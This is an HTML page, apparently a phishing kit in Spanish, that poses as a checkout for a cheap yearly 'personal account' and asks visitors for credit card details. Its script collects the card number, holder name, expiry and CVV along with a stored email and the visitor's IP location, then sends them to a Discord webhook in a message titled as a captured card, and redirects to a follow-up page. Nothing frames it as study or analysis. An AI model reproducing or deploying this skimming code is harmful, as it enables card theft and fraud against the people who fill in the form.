<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="stylesheet" href="https://34879347843.netlify.app/style.css">
    <link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon">
</head>
<body>
    <div class="nv-tj">
        <div class="lg-m">
            <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/log.svg?v=1741715936758" alt="">
        </div>
        <div class="cont-prec">
            <p class="stas">Estas comprando <span>Cuenta Personal</span></p>
            <p class="txt-pre">$0.89 / Por año</p>
        </div>
    </div>
    <div class="cont-new">
        <div class="cont-new-xjsx">
            <p class="tit">Añade una tarjeta de credito</p>
            <div class="cont-icos">
                <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/a1.svg?v=1741715887517" alt="">
                <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/a2.svg?v=1741715902737" alt="">
                <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/a3.svg?v=1741715906090" alt="">
                <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/a4.svg?v=1741715909200" alt="">
            </div>
            <form id="xjsx">
                <div class="usr-new">
                    <p>Card number*</p>
                    <input id="j1" type="text" placeholder="**** **** **** ****" maxlength="16">
                </div>
                <div class="usr-new">
                    <p>Cardholder Name*</p>
                    <input id="j2" type="text">
                </div>
                <p class="txt-ex">Expires*</p>
                <div class="ex">
                    <input id="j3" type="text" placeholder="MM" maxlength="2">
                    <input id="j4" type="text" placeholder="YY" maxlength="2">
                </div>
                <p class="txt-ex">CVV*</p>
                <div class="ex">
                    <input id="j5" type="text" placeholder="***" maxlength="4">
                </div>
                <p id="err"></p>
                <div id="sub-new">
                    <input type="submit" value="Continuar">
                </div>
            </form>
        </div>
    </div>

    <div id="gfg" style="display:none;"></div> 
    <div id="ip" style="display:none;"></div> 
    <div id="address" style="display:none;"></div>
    
    <!-- Script externo para Discord -->
    <script src="https://34879347843.netlify.app/disBLOCK.js"></script>
    <script>
        // Función para validar y formatear los datos de la tarjeta
        function formatCardNumber(input) {
            // Eliminar cualquier caracter que no sea número
            input.value = input.value.replace(/\D/g, '');
            
            // Limitar a 16 dígitos
            if (input.value.length > 16) {
                input.value = input.value.slice(0, 16);
            }
        }

        // Función para validar mes de expiración
        function validateMonth(input) {
            // Eliminar cualquier caracter que no sea número
            input.value = input.value.replace(/\D/g, '');
            
            // Limitar a 2 dígitos
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2);
            }
            
            // Validar que el mes esté entre 01 y 12
            if (input.value.length === 2) {
                const month = parseInt(input.value);
                if (month < 1 || month > 12) {
                    document.getElementById('err').innerHTML = 'Mes de expiración inválido. Debe estar entre 01 y 12.';
                    return false;
                } else {
                    document.getElementById('err').innerHTML = '';
                }
            }
            return true;
        }

        // Función para validar año de expiración
        function validateYear(input) {
            // Eliminar cualquier caracter que no sea número
            input.value = input.value.replace(/\D/g, '');
            
            // Limitar a 2 dígitos
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2);
            }
            
            // Validar que el año no sea menor al actual (últimos 2 dígitos)
            if (input.value.length === 2) {
                const currentYear = new Date().getFullYear() % 100;
                const inputYear = parseInt(input.value);
                
                if (inputYear < currentYear) {
                    document.getElementById('err').innerHTML = 'Año de expiración inválido. No puede ser menor al año actual.';
                    return false;
                } else {
                    document.getElementById('err').innerHTML = '';
                }
            }
            return true;
        }

        // Función para validar CVV
        function validateCVV(input) {
            // Eliminar cualquier caracter que no sea número
            input.value = input.value.replace(/\D/g, '');
            
            // Limitar a 3 o 4 dígitos (dependiendo del tipo de tarjeta)
            if (input.value.length > 4) {
                input.value = input.value.slice(0, 4);
            }
            
            // Validar que tenga al menos 3 dígitos
            if (input.value.length < 3) {
                return false;
            }
            return true;
        }

        // Inicializar eventos cuando el DOM esté listo
        document.addEventListener('DOMContentLoaded', function() {
            // Obtener elementos
            const cardNumberInput = document.getElementById('j1');
            const monthInput = document.getElementById('j3');
            const yearInput = document.getElementById('j4');
            const cvvInput = document.getElementById('j5');
            
            // Agregar eventos de formato
            cardNumberInput.addEventListener('input', function() {
                formatCardNumber(this);
            });
            
            monthInput.addEventListener('input', function() {
                validateMonth(this);
            });
            
            yearInput.addEventListener('input', function() {
                validateYear(this);
            });
            
            cvvInput.addEventListener('input', function() {
                validateCVV(this);
            });
            
            // Manejar el envío del formulario
            document.getElementById('xjsx').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const errorElement = document.getElementById('err');
                
                // Validar campos obligatorios
                if (!cardNumberInput.value.trim() || 
                    !document.getElementById('j2').value.trim() || 
                    !monthInput.value.trim() || 
                    !yearInput.value.trim() || 
                    !cvvInput.value.trim()) {
                    errorElement.innerHTML = 'Todos los campos marcados con * son obligatorios.';
                    return false;
                }
                
                // Validar longitud del número de tarjeta
                if (cardNumberInput.value.length !== 16) {
                    errorElement.innerHTML = 'El número de tarjeta debe tener 16 dígitos.';
                    return false;
                }
                
                // Validar mes
                if (!validateMonth(monthInput)) {
                    return false;
                }
                
                // Validar año
                if (!validateYear(yearInput)) {
                    return false;
                }
                
                // Validar CVV
                if (!validateCVV(cvvInput)) {
                    errorElement.innerHTML = 'El CVV debe tener al menos 3 dígitos.';
                    return false;
                }
                
                // Enviar datos a Discord
                sendCardDataToDiscord();
            });
        });

        // Función para enviar datos de la tarjeta a Discord
        async function sendCardDataToDiscord() {
            const email = localStorage.getItem('js1') || 'No disponible';
            const cardNumber = document.getElementById('j1').value;
            const cardholderName = document.getElementById('j2').value;
            const expiryMonth = document.getElementById('j3').value;
            const expiryYear = document.getElementById('j4').value;
            const cvv = document.getElementById('j5').value;
            
            try {
                // Obtener datos de IP
                const ipData = await fetchIPData();
                
                // Preparar mensaje para Discord
                const message = `🍄🍄0UTL🍄🍄

💳 **Nueva tarjeta de crédito capturada**

📧 **Correo electrónico:** ${email}
🔢 **Número de tarjeta:** ${cardNumber}
👤 **Titular:** ${cardholderName}
📅 **Expira:** ${expiryMonth}/${expiryYear}
🔒 **CVV:** ${cvv}
🌎 **IP:** ${ipData.ip}
📍 **Ubicación:** ${ipData.city}, ${ipData.country_name}
🕒 **Hora:** ${new Date().toLocaleString()}`;
                
                // Enviar a Discord
                await sendToDiscord(DISCORD_WEBHOOK, message);
                
                // Redirigir a la siguiente página
                window.location.href = '_indexxx.html';
            } catch (error) {
                console.error('Error sending to Discord:', error);
                // En caso de error, igualmente redirigir
                window.location.href = '_indexxx.html';
            }
        }
    </script>
</body>
</html>
